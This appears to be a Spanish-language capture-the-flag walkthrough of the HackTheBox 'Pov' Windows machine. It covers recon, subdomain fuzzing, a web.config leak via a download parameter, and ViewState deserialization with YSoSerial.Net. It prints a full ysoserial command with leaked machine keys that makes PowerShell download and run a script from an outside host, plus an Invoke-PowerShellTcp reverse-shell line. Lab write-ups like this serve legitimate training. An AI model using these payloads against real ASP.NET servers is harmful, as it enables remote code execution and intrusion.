### Ping
```python
ping -c 1 10.10.11.251
PING 10.10.11.251 (10.10.11.251) 56(84) bytes of data.
64 bytes from 10.10.11.251: icmp_seq=1 ttl=127 time=157 ms

--- 10.10.11.251 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 156.729/156.729/156.729/0.000 ms
```

### TTL 127= Windows
### nmap
```python
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds
```
obtenemos el nombre de dominio del host y lo agregamos al /etc/hosts

### Enumeración del puerto http (80)

![[Pasted image 20240310205202.png]]

### Fuzzing con wfuzz (Directorios)
no obtenemos nada interesante por el momento
![[Pasted image 20240310205503.png]]

### Fuzzing con wfuzz (Subdominios)
encontramos un subdominio sospechoso. lo agregamos al /etc/hosts
![[Pasted image 20240310210838.png]]

### Web dev.pov.htb

![[Pasted image 20240311105847.png]]

### BurpSuite
interceptamos la petición de download cv
![[Pasted image 20240310212727.png]]
cambiamos el EVENTVALIDATION= cv.pdf por = /web.config. esto nos muestra información de la pagina la cual la hace vulnerable a una explotacion de VIEWSTATE

### Vulnerabilidad Exploiting __VIEWSTATE
![[Pasted image 20240311105353.png]]
usaremos la herramienta YSoSerial.Net esta herramienta es para maquina windows asi que debes tener una maquina windows donde poder ejecutar esto (tambien puedes ejecutarlo desde kali linux pero debes complementarlo con otras herramientas)

### YSoSerial.Net
usaremos la siguiente sintax
```python
C:\FilesExplotation\ysoserial-1.34\Release>.\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.64/Invoke-PowerShellTcp.ps1')" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

![[Pasted image 20240311110529.png]]

### Invoke-PowerShelltcp
ahora usaremos el invoke-powershell para invocar automaticamente esta shell. al final del codigo debemos agregar la siguiente linea 

```python
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```

![[Pasted image 20240311110955.png]]
### Servidor con python

![[Pasted image 20240311110845.png]]

### rlwrap

![[Pasted image 20240311105747.png]]